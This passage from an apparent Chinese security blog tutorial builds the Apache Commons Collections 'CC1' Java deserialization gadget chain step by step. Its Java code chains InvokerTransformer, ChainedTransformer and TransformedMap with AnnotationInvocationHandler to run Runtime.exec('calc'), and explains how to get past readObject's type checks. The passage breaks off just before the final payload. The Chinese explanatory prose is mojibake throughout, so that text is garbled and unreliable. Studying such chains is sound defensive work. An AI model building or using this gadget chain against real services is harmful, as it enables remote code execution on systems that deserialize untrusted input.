<li>æœ€åå†åœ¨ideaä¸­å·¦ä¸Šè§’ æ–‡ä»¶ - é¡¹ç›®ç»“æ„ï¼Œåœ¨SDKçš„æºè·¯å¾„ï¼ˆsource pathï¼‰ä¸­æ·»åŠ srcæ–‡ä»¶å¤¹å³å¯</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png"></p>
<hr>
<p>æŸ¥æ‰¾setValueçš„è°ƒç”¨ï¼Œå‘ç°åœ¨<code>AnnotationInvocationHandler</code>çš„readObjectä¸­è°ƒç”¨äº†setValueï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png"></p>
<p>readObjectä¸­æœ‰ä¸€ä¸ªéå†mapçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ä»£æ›¿æˆ‘ä»¬ä¸Šé¢æ‰‹åŠ¨éå†mapæ‹¿entryçš„æ“ä½œäº†ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) {</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException {</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        } <span class="keyword">catch</span>(IllegalArgumentException e) {</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//membersValueæ˜¯æ„é€ å‡½æ•°æ¥æ”¶åˆ°çš„ä¸€ä¸ªMap</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) {  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>payloadä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>});</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       map.put(<span class="string">"k"</span>,<span class="string">"v"</span>);</span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">       <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<span class="comment">//AnnotationInvocationHandlerç±»ä¸ºdefault ä¸èƒ½ç›´æ¥è®¿é—® è¦é€šè¿‡åå°„è·å–</span></span><br><span class="line">       <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);<span class="comment">//è·å–æ„é€ å‡½æ•°</span></span><br><span class="line">       annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>); <span class="comment">//å®ä¾‹åŒ–</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);<span class="comment">//æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ³¨è§£ç±»å‹çš„calssï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºMapç±»å‹çš„classï¼Œä¹Ÿå°±æ˜¯readObjectä¸­éå†Mapæ—¶çš„memberValues</span></span><br><span class="line">    serialize(o);</span><br><span class="line">       unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<hr>
<p>ä½†æ˜¯è¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li></li>
</ol>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>è¿™é‡Œå¯¹setValueä¼ è¿›å»çš„å‚æ•°åº”è¯¥æ˜¯currentRuntimeï¼Œä½†æˆ‘ä»¬å‘ç°è¿™ä¸ªæ–¹æ³•å†…çš„å‚æ•°å€¼æˆ‘ä»¬ä¸ç¡®å®šèƒ½ä¸èƒ½æ§åˆ¶</p>
<p>2.</p>
<p>currentRuntimeæ˜¯æˆ‘ä»¬è‡ªå·±é€šè¿‡getRuntimeæ–¹æ³•å¾—åˆ°çš„ï¼Œä½†Runtimeå¯¹è±¡å¹¶æ²¡æœ‰ç»§æ‰¿Serializableï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥ä¼ å…¥currentRuntimeä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) {  <span class="comment">// i.e. member still exists</span></span><br><span class="line">               <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                     value <span class="keyword">instanceof</span> ExceptionProxy))</span><br><span class="line">                     memberValue.setValue</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨æ‰§è¡ŒsetValueå‰éœ€è¦ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­</p>
<hr>
<p>æˆ‘ä»¬å…ˆæ¥è§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨Runtime.classæ¥ä»£æ›¿å®ƒï¼Œå› ä¸ºClassç±»ä¸­ç»§æ‰¿äº†Serializableï¼Œæˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåå°„å¼¹è®¡ç®—å™¨çš„paylaodç„¶åä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> runtime.getMethod(<span class="string">"exec"</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtime.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">execMethod.invoke(getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>é€šè¿‡InvokerTransformerè·å–getRuntimeæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getMethod"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}).transform(Runtime.class);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åˆ©ç”¨InvokerTransformeræ‰§è¡Œä»»æ„ä»£ç çš„ç‰¹ç‚¹æ‰§è¡Œäº†getMethodæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°ä¸ºgetRuntimeï¼Œæœ€ç»ˆæ‹¿åˆ°äº†getRuntimeæ–¹æ³•</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å†åˆ©ç”¨InvokerTransformeré€šè¿‡æ‰§è¡Œinvokeæ–¹æ³•æ¥è°ƒç”¨getRuntimeæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}).transform(getRuntime);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>å†é€šè¿‡åå°„å¼¹è®¡ç®—å™¨å°±å¯ä»¥äº†ï¼Œpayloadä¿®æ”¹å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨é“¾ç±»ä¼¼äºä¸€ä¸ªé¦–å°¾ç›¸è¿çš„ç»“æ„ï¼Œä¸Šä¸€ä¸ªtransformerä¼ å…¥ä¸‹ä¸€ä¸ªè¿›è¡Œè°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class, Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>, <span class="literal">null</span>}).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class, Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>, <span class="literal">null</span>}).transform(getRuntime);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>}).transform(currentRuntime);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>javaä¸­åˆšå¥½æœ‰ä¸€ä¸ªTransformerå¯ä»¥è®©ä»–ä»¬ä¸²èµ·æ¥ï¼Œå½¢æˆè¿™æ ·ä¸€ä¸ªé“¾å¼è°ƒç”¨ç»“æ„ï¼Œè¿™æ ·å°±å¯ä»¥æ›´ä¼˜é›…çš„æ‰§è¡Œpayloadï¼Œå°±æ˜¯<code>ChainedTransformer</code>ï¼Œæˆ‘ä»¬å°†ä¸Šé¢çš„ä¸‰ä¸ªtransformerä»¥æ•°ç»„æ ¼å¼ä¼ å…¥ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class, Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class, Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        });</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>è¿™æ ·è¿™ä¸ªé—®é¢˜å°±è§£å†³äº†ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸€ä¸²payloadç»“åˆåŸå…ˆçš„payloadè¿›è¡Œæ›¿æ¢ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class, Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class, Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">	   <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"k"</span>,<span class="string">"v"</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å‘ç°å¹¶ä¸èƒ½æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è§£å†³æˆ‘ä»¬çš„å¦å¤–ä¸¤ä¸ªé—®é¢˜äº†ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåˆ¤æ–­åšäº†ä»€ä¹ˆäº‹</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException {</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        annotationType = AnnotationType.getInstance(type); <span class="comment">//typeä¸ºOverride</span></span><br><span class="line">    } <span class="keyword">catch</span>(IllegalArgumentException e) {</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="comment">//è·å–Overrideä¸­çš„æˆå‘˜å˜é‡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">//å¿…é¡»ä½¿è¿”å›å€¼ä¸ä¸ºnull ä¹Ÿå°±æ˜¯memberTypesä¸­è¦æœ‰name</span></span><br><span class="line">        										 <span class="comment">// æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©nameä¸ºAnnotionå†…éƒ¨çš„å˜é‡å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) {  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>é¦–å…ˆç¬¬ä¸€ä¸ªifåˆ¤æ–­memberTypeæ˜¯å¦ä¸ºç©ºï¼ŒmemberTypeæ˜¯æ„é€ å‡½æ•°ä¼ å…¥è¿›æ¥çš„Annotationçš„æˆå‘˜å˜é‡ï¼Œnameæ˜¯ä»æ„é€ å‡½æ•°ä¼ å…¥çš„mapéå†æ—¶è·å–çš„keyï¼Œä¸Šé¢ä»£ç çš„æ³¨é‡Šä¸­æåˆ°äº†å¦‚æœè¦ç»•è¿‡è¿™å±‚ifï¼Œæˆ‘ä»¬ä¼ å…¥çš„mapçš„keyä¸­å°±å¿…é¡»è¦æœ‰ä¼ å…¥çš„Annotationçš„å˜é‡å€¼ï¼Œä½†Overrideå†…éƒ¨æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨Targetï¼Œå¹¶ä¸”å°†å…¶ä¸­çš„valueå±æ€§å­˜å…¥åˆ°mapä¸­å»</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png"></p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å†çœ‹ç¬¬äºŒå±‚ifï¼ŒmemberTypeæ˜¯ä¸€ä¸ªAnnotationï¼Œè€Œvalueæ˜¯ä¸€ä¸ªVï¼ˆé”®å€¼å¯¹ä¸­çš„Valueç±»ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›falseï¼Œé€šè¿‡ç¬¬äºŒå±‚ifï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line"><span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy )) {</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>å‰©ä¸‹çš„æœ€åä¸€ä¸ªé—®é¢˜ï¼Œç°åœ¨setValueä¸­ä¼ å…¥çš„ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦å¦å¤–ä¸€ä¸ªTransformerï¼Œ<code>ConstantTransformer</code>ï¼Œ</p>
<p>å®ƒçš„transformæ–¹æ³•ä¸è®ºæ¥æ”¶ä»€ä¹ˆå¯¹è±¡ï¼Œéƒ½å¯ä»¥åŸå°ä¸åŠ¨çš„è¾“å‡ºä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„å€¼ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> {</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æ‰€ä»¥æœ€ç»ˆpayloadä¿®æ”¹ä¸ºï¼š</p>
